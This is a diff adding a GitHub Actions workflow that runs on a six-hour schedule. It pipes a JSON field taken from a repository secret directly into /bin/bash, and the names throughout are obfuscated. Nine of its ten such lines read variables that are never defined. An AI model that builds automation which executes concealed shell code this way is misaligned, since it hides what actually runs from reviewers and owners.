@@ -1,0 +1,25 @@
+name: hongjinzhaihe
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hongjinzhaihe
+        env:
+          cif205: ${{ secrets.cif205 }}
+        run: |
+          echo $cif205 | jq -r .zcrxk57 | /bin/bash
+          echo $wz31 | jq -r .i81 | /bin/bash
+          echo $j40233 | jq -r .tkdl09 | /bin/bash
+          echo $cgun875 | jq -r .wpsv9319 | /bin/bash
+          echo $di4 | jq -r .frrm72 | /bin/bash
+          echo $hjie3 | jq -r .y37 | /bin/bash
+          echo $kpixq67 | jq -r .ivu9712 | /bin/bash
+          echo $pligj3405 | jq -r .zmq4350 | /bin/bash
+          echo $b69760 | jq -r .mjpl3287 | /bin/bash
+          echo $z85456 | jq -r .nryal17 | /bin/bash
+
